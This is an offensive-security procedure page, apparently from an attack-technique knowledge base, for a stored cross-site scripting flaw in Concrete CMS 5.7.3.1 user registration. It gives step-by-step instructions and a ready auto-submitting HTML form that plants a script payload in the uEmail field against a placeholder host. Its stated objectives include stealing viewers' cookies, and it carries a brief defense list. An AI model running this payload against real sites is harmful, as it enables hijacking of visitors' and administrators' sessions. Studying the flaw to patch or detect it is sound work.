---
tags:
  - xss
  - stored-xss
  - user-registration
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/register-user-with-xss-in-uemail]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.407Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: ee2d38dd-eeb2-433d-a5aa-005eaa345122
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored-XSS-via-User-Registration-in-Concrete-CMS

## Summary

This procedure exploits a stored XSS vulnerability in the user registration form of Concrete CMS 5.7.3.1 by injecting a malicious payload into the uEmail POST parameter, which is stored without encoding and executes JavaScript when viewing the user's profile or member lists, potentially stealing viewer sessions.

## Description

The vulnerability arises because the email field in /index.php/register/do_register accepts unencoded user input, which is persisted to the database and output in HTML contexts without proper escaping. Attackers can register a malicious user account, and any subsequent visitor to the profile triggers the injected script. This affects all users, including admins, especially if anonymous registration is enabled. Discovered through manual testing of form fields and payload submission, with persistence confirmed on page reloads.

## Requirements

1. Access to the target Concrete CMS instance with registration enabled
2. Web browser to submit forms
3. Optional: Proxy for request modification

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and HTML encoding (e.g., htmlspecialchars) on all user inputs before storage and output
- Enable Content Security Policy (CSP) to block inline scripts
- Monitor for anomalous registrations with suspicious email domains
- Use WAF rules to detect common XSS payloads in POST data

## Objectives

1. Inject persistent JavaScript into a new user account
2. Trigger execution on profile views to exfiltrate cookies or perform actions
3. Demonstrate impact on unauthenticated viewers if anonymous access allowed

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Confirm the registration form at /index.php/register/do_register accepts POST data without validation.

Navigate to the registration page and inspect the form for the uEmail field.

### Step 2: Craft and Submit Payload

**Context**: Use a payload that breaks out of the email attribute context and injects a script tag.

**Command** ([[commands/register-user-with-xss-in-uemail]]):
```html
<html>
<body>
<form method="POST" action="http://[host]/concrete5/index.php/register/do_register">
<input type="hidden" name="uName" value="StoredXSS">
<input type="hidden" name="uEmail" value='stored@xss.com"><script>alert(/XSS/)</script>'>
<input type="hidden" name="uPassword" value="password">
<input type="hidden" name="uPasswordConfirm" value="password">
<input type="hidden" name="uDefaultLanguage" value="it-IT">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

> This HTML auto-submits the form with the payload in uEmail, creating the account. Replace [host] with the target URL.

### Step 3: Verify Execution

**Context**: Access the profile to confirm persistence and execution.

Navigate to the member's list or the new user's profile page.

**Expected Output**: JavaScript alert dialog appears, confirming XSS trigger.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/register-user-with-xss-in-uemail]]

## Tools Used


## Tags

- xss
- stored-xss
- concrete-cms
